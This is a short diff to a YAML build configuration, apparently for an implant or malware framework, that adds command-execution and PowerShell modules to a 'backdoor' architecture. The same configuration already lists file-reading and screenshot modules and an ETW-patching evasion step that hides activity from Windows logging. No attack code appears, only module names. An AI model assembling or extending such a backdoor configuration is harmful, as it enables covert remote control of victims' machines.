@@ -13,8 +13,12 @@ commands:
   - commands/cmd_filelist
   - commands/cmd_fileread
   - commands/cmd_screenshot
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
 
 arch: arch/backdoor
+
+resources: true
 
 evasion:
   - evasion/etw_patch
